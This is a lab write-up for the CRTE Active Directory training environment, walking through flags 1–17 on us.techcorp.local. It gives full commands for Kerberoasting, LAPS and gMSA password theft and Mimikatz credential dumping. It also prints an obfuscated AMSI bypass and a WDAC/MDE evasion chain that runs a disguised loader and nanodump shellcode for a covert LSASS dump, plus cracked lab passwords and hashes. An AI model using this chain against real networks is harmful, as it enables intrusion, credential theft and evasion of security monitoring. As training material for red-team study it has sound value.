# CRTE Lab

## Flag 1,2 - Domain Enumeration

Enumerate following for the us.techcorp.local domain:

* Users&#x20;
* &#x20;Computers&#x20;
* &#x20;Domain Administrators&#x20;
* &#x20;Enterprise Administrators&#x20;
* &#x20;Kerberos Policy

Use BloodHound to do it or ad module

## Flag 3,4 - Trust Enumeration

To list only the external trusts using PowerView:

{% code overflow="wrap" %}
```powershell
Get-ForestDomain -Verbose | Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'}
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (6).png" alt=""><figcaption></figcaption></figure>

The trust is bidirectional, so enumerate the trust that eu.local has

```powershell
Get-ForestTrust -Forest eu.local
```

<figure><img src="../.gitbook/assets/immagine (1) (1).png" alt=""><figcaption></figcaption></figure>

## FLAG 5/6/7 - Name of the service for privesc on local machine

* Exploit a service on studentx and elevate privileges to local administrator.
* Identify a machine in the domain where studentuserx has local administrative access due to group membership.

Use PowerUp to find a privesc

```powershell
Invoke-AllChecks
```

<figure><img src="../.gitbook/assets/immagine (2) (1).png" alt=""><figcaption></figcaption></figure>

And exploit the service

```powershell
Invoke-ServiceAbuse -Name 'ALG' -UserName us\studentuser64
```

Now log off and log on to gain admin privileges

Import PowerView to find computer wjere we have access as Local Admin

```powershell
Find-LocalAdminAccess
```

Nothing but you can see from bloodhound that the group studentuser is enrolled in the Managers group

Managers group has generic all on MachineAdmins Group, so with AdModule we can add ourself to this group.

```powershell
Add-ADGroupMember -Identity MachineAdmins -Members studentuser64 -Verbose
```

<figure><img src="../.gitbook/assets/immagine (3) (1).png" alt=""><figcaption></figcaption></figure>

Now relogin to update the permissions and try to access to us-mgmt

```powershell
winrs -r:us-mgmt whoami
```

<figure><img src="../.gitbook/assets/immagine (4) (1).png" alt=""><figcaption></figcaption></figure>

By enumerating the groups which we belongs we can se that in the mgmt OU we are Administrators.

## Flag 8 - SevicePrincipalName of the user serviceaccount that we Kerberoasted

Using PowerView see if there are any SPN

{% code overflow="wrap" %}
```powershell
Get-DomainUser –SPN
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (5) (1).png" alt=""><figcaption></figcaption></figure>

the kerberoast attack can be done in wto ways

#### Rubeus and John

First use Argspli.bat to avoid detection in the cmd

<figure><img src="../.gitbook/assets/immagine (6) (1).png" alt=""><figcaption></figcaption></figure>

Now load Rubeus with the Loader to avoid detection and launch an attack against ServiceAccount

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:serviceaccount /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (7).png" alt=""><figcaption></figcaption></figure>

Now crackit with john. The password is _Password123_

#### KerberosRequestorSecurityToken.NET class from PowerShell, Mimikatz and tgsrepcrack.py

We can also use the KerberosRequestorSecurityToken .NET class from PowerShell to request a ticket.

{% code overflow="wrap" %}
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "USSvc/serviceaccount"
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (8).png" alt=""><figcaption></figcaption></figure>

Use Mimikatz to extract the ticket

```powershell
Invoke-Mimi -Command '"kerberos::list /export"'
```

<figure><img src="../.gitbook/assets/immagine (9).png" alt=""><figcaption></figcaption></figure>

and crack it

{% code overflow="wrap" %}
```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-60210000-studentuser64@USSvc~serviceaccount-US.TECHCORP.LOCAL.kirbi
```
{% endcode %}

## Flag 9 - Password for supportXuser that we Kerberoasted&#x20;

With PowerView see if we have any other interesting ACL with studentusers group:

{% code overflow="wrap" %}
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (10).png" alt=""><figcaption></figcaption></figure>

Since studentuser64 has GenericAll rights on the support64user, let’s force set a SPN on it. Using ActiveDirectory module:

{% tabs %}
{% tab title="Powerview" %}
{% code overflow="wrap" %}
```
Set-DomainObject -Identity support64user -Set @{serviceprincipalname='us/myspn64'} -Verbose
```
{% endcode %}
{% endtab %}

{% tab title="Ad-Module" %}
{% code overflow="wrap" %}
```
Set-ADUser -Identity Support64User -ServicePrincipalNames @{Add='us/myspn64'} -Verbose
```
{% endcode %}
{% endtab %}
{% endtabs %}

Check if SPN is set up now

{% code overflow="wrap" %}
```powershell
Get-ADUser -Identity support64user -Properties ServicePrincipalName | select ServicePrincipalName
```
{% endcode %}

{% hint style="info" %}
If nothing showed might work the same
{% endhint %}

Now crack it. The password is _Desk@123_

## Flag 10/11/12 -  LAPS

To enumerate LAPS import the module AdmPwd.PS.psd1, AD-Module and use the script Get-LapsPermissions.ps1

<figure><img src="../.gitbook/assets/immagine (4).png" alt=""><figcaption></figcaption></figure>

Also powerview can be used

{% code overflow="wrap" %}
```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (5).png" alt=""><figcaption></figcaption></figure>

So, the studentusers group can read password for LAPS managed Administrator on the us-mgmt machine. Let's try it using the Active Directory module, LAPS module and PowerView.

{% tabs %}
{% tab title="AD-Module" %}


{% code overflow="wrap" %}
```powershell
Get-ADComputer -Identity us-mailmgmt -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
```
{% endcode %}
{% endtab %}

{% tab title="PowerView" %}
{% code overflow="wrap" %}
```powershell
Get-DomainObject -Identity us-mailmgmt | select -ExpandProperty ms-mcs-admpwd
```
{% endcode %}
{% endtab %}

{% tab title="LAPS Module" %}
```powershell
Get-AdmPwdPassword -ComputerName us-mailmgmt
```
{% endtab %}
{% endtabs %}

<figure><img src="../.gitbook/assets/immagine.png" alt=""><figcaption></figcaption></figure>

The password is _a\[9\&Dhs./tu-]W_

_So with this password let's try to access us-mailmgmt_

```powershell
winrs -r:us-mailmgmt -u:.\administrator -p:a[9&Dhs./tu-]W cmd
```

<figure><img src="../.gitbook/assets/immagine (1).png" alt=""><figcaption></figcaption></figure>

Now extract credentials of interactive logon sessions and service accounts from us-mailmgmt

To do so we need to use PS-Session and Invoke-mimi.

First open a PS-Session on US-mailmgmt

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString 'a[9&Dhs./tu-]W' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("us-mailmgmt\administrator", $passwd)
$mailmgmt = New-PSSession -ComputerName us-mailmgmt -Credential $creds
```
{% endcode %}

Enter the session and bypass the AMSI

```powershell
Enter-PSSession $mailmgmt
```

{% code overflow="wrap" %}
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (2).png" alt=""><figcaption></figcaption></figure>

Now launch Invoke-Mimi throught the session

{% code overflow="wrap" %}
```powershell
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $mailmgmt
```
{% endcode %}

Enter the session again and dump dhe creds

```powershell
Invoke-Mimi -Command '"sekurlsa::keys"'
```

<figure><img src="../.gitbook/assets/immagine (3).png" alt=""><figcaption></figcaption></figure>

Provisioningsvc aes: _a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a_

Provisioningsvc rc4: _44dea6608c25a85d578d0c2b6f8355c4_

## Flag 13/14 - GMSa

To enumerate gMSAs, we can use the ADModule

```
Get-ADServiceAccount -Filter *
```

<figure><img src="../.gitbook/assets/immagine (11).png" alt=""><figcaption></figcaption></figure>

Enumerate the Principals that can read the password blob:

{% code overflow="wrap" %}
```powershell
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (12).png" alt=""><figcaption></figcaption></figure>

Recall that we got secrets of provisioning svc from us-mailmgmt. Start a new process as the provisioningsvc user.

{% code overflow="wrap" %}
```powershell
./Rubeus.exe asktgt /user:provisioningsvc /aes256:a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

Now launch powerhsell and import the AD-Module to get the password blob

{% code overflow="wrap" %}
```powershell
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
```
{% endcode %}

Now import ds internals to decrypt the blob

```powershell
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
```

Now convert it to NT

```powershell
ConvertTo-NTHash -password $decodedpwd.SecureCurrentPassword
```

<figure><img src="../.gitbook/assets/immagine (13).png" alt=""><figcaption></figcaption></figure>

RC4: 123fef24212a5617ed8234dd54a4d7ad&#x20;

## FLAG 15/16/17 - WDAC e MDE

Now start a process as jumpone

{% code overflow="wrap" %}
```powershell
./Rubeus.exe asktgt /user:jumpone /rc4:123fef24212a5617ed8234dd54a4d7ad /opsec /force /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (14).png" alt=""><figcaption></figcaption></figure>

Now launch a powershell session with invishell and use Find-PSRemotingLocalAdminAccess.ps1 to find where this user has damin access

```powershell
Find-PSRemotingLocalAdminAccess -Domain us.techcorp.local -Verbose
```

<figure><img src="../.gitbook/assets/immagine (15).png" alt=""><figcaption></figcaption></figure>

Let us now test to see if an EDR is enabled on the target using Invoke-EDRChecker.ps1 as follows. Run the following command in the process spawned as jumpone:

```
Invoke-EDRChecker -Remote -ComputerName us-jump3
```

<figure><img src="../.gitbook/assets/immagine (16).png" alt=""><figcaption></figcaption></figure>

EDR is enabled. Access us-jump3 using winrs. We need to check also if other security measure are in place like wdac.

{% code overflow="wrap" %}
```powershell
winrs -r:us-jump3 "powershell Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard"
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (17).png" alt=""><figcaption></figcaption></figure>

We can now attempt to copy and parse the WDAC config deployed on us-jump to find suitable bypasses and loopholes in the policy.

```powershell
dir \\us-jump3.US.TECHCORP.LOCAL\c$\Windows\System32\CodeIntegrity
```

<figure><img src="../.gitbook/assets/immagine (18).png" alt=""><figcaption></figcaption></figure>

We find a deployed policy named DG.bin.p7 / SiPolicy.p7b in the CodeIntegrity folder. Copy either policy binary back over to our studentVM.

{% code overflow="wrap" %}
```powershell
copy \\us-jump3.US.TECHCORP.LOCAL\c$\Windows\System32\CodeIntegrity\DG.bin.p7 C:\AD\Tools
```
{% endcode %}

Now import CIPolicyParser.ps1 to parse the copied policy binary

{% code overflow="wrap" %}
```powershell
ConvertTo-CIPolicy -BinaryFilePath C:\AD\Tools\DG.bin.p7 -XmlFilePath C:\AD\Tools\DG.bin.xml
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (19).png" alt=""><figcaption></figcaption></figure>

Noa analyze it to findout that vmware Workstation has allow permission to execute

<figure><img src="../.gitbook/assets/immagine (20).png" alt=""><figcaption></figcaption></figure>

We can now attempt to perform an LSASS dump on the target us-jump using a covert technique / tool to bypass MDE along with WDAC.

We will be using the mockingjay POC (loader / dropper) along with nanodump shellcode to bypass MDE detections and perform a covert LSASS Dump. To bypass WDAC we edit File Attributes to match the Product Name: "Vmware Workstation" on all required files (exe / dlls) of the mockingjay POC.

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\msvcp140.dll --set-version-string "ProductName" "Vmware Workstation"
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\vcruntime140.dll --set-version-string "ProductName" "Vmware Workstation"
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\vcruntime140_1.dll --set-version-string "ProductName" "Vmware Workstation"
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\mockingjay.exe --set-version-string "ProductName" "Vmware Workstation"
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\mockingjay\rcedit-x64.exe C:\AD\Tools\mockingjay\mscorlib.ni.dll --set-version-string "ProductName" "Vmware Workstation"
```
{% endcode %}

Now compress them in a zip

{% code overflow="wrap" %}
```powershell
Compress-Archive -Path C:\AD\Tools\mockingjay\msvcp140.dll,C:\AD\Tools\mockingjay\vcruntime140.dll,C:\AD\Tools\mockingjay\vcruntime140_1.dll,C:\AD\Tools\mockingjay\mockingjay.exe, C:\AD\Tools\mockingjay\mscorlib.ni.dll -DestinationPath "C:\AD\Tools\mockingjay\mockingjay.zip"
```
{% endcode %}

Now convert nanodump into compatible shellcode using donut along with the args: spoof- callstack (-sc), fork LSASS process before dumping (-f) and output the dump to a file named nano.dmp (--write) to make it dump LSASS in a covert way.

{% hint style="info" %}
shellcode dosen't need to be edited using rcedit to bypass WDAC.
{% endhint %}

{% code overflow="wrap" %}
```powershell
C:\AD\Tools\mockingjay\donut.exe -f 1 -p " -sc -f --write nano.dmp" -i C:\AD\Tools\mockingjay\nanodump.x64.exe -o C:\AD\Tools\mockingjay\nano.bin
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (21).png" alt=""><figcaption></figcaption></figure>

Confirm that the mockingjay poc and nano.bin shellcode is undetected by AV using AmsiTrigger / DefenderCheck:

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">C:\AD\Tools\DefenderCheck.exe C:\AD\Tools\mockingjay\mockingjay.exe
<strong>C:\AD\Tools\DefenderCheck.exe C:\AD\Tools\mockingjay\nano.bin
</strong></code></pre>

Now host mockingjay.zip and nano.bin on our student VM using HFS. Make sure firewall is disabled before doing so. From the process running with privileges of jumpone, connect to us-jumpX and then download mockingjay.zip using msedge.

{% hint style="info" %}
Using commonly abused binaries such as certutil for downloads, will result in a detection on MDE.
{% endhint %}

{% hint style="warning" %}
Make sure to disable firewall on the hosting machine
{% endhint %}

{% code overflow="wrap" %}
```
"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --incognito http://192.168.100.64/mockingjay.zip
```
{% endcode %}

Now extract the contents from the mockingjay.zip archive using tar and attempt to perform an LSASS dump invoking the nano.bin shellcode hosted on our studentvm webserver.

```
mockingjay.exe 192.168.100.64 "/nano.bin"
```

An LSASS dump file is written called nano.dmp with an invalid signature since a normal LSASS dump on disk could trigger an MDE detection. We will now exfiltrate this dump file, restore and parse it for credentials.

Copy it on the local machine

{% code overflow="wrap" %}
```powershell
copy \\us-jump3.US.TECHCORP.LOCAL\c$\users\jumpone$\Downloads\nano.dmp C:\AD\Tools\mockingjay
```
{% endcode %}

Now restore the signature

```powershell
.\restore_signature.exe .\nano.dmp
```

Now use SafetyKatz with the argsplit method for the word "sekurlsa::minidump" to extract the credentials

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% C:\AD\Tools\mockingjay\nano.dmp" "sekurlsa::keys" "exit"
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (22).png" alt=""><figcaption></figcaption></figure>

pawadmin aes: _a92324f21af51ea2891a24e9d5c3ae9dd2ae09b88ef6a88cb292575d16063c30_\
_RC4:_ 36ea28bfa97a992b5e85bd22485e8d52

appsvc pwd: Us$rT0AccessDBwithImpersonation\
aes: b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335\
rc4: 1d49d390ac01d568f0ee9be82bb74d4c

webmaster aes: 2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0\
rc4: 23d6458d06b25e463b9666364fb0b29f

On us-jump3, we can check for certificates that can be used later. Spawn a process with the privileges of pawadmin:

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:pawadmin /domain:us.techcorp.local /aes256:a92324f21af51ea2891a24e9d5c3ae9dd2ae09b88ef6a88cb292575d16063c30 /opsec /createnetonl:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (24).png" alt=""><figcaption></figcaption></figure>

Run the below commands in the new process to enumerate the LocalMachine certificate store:

```
certutil -store My
```

Serial Number: 770000002116e9d99c3a4ceaf1000000000021

<figure><img src="../.gitbook/assets/immagine (25).png" alt=""><figcaption></figcaption></figure>

export it

{% code overflow="wrap" %}
```
certutil -exportpfx -p SecretPass@123 770000002116e9d99c3a4ceaf1000000000021 C:\Users\pawadmin\Downloads\pawadmin.pfx
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (26).png" alt=""><figcaption></figcaption></figure>

And copy it on local machine

copy \\\us-jump3.US.TECHCORP.LOCAL\c$\users\pawadmin\Downloads\pawadmin.pfx C:\AD\Tools\\
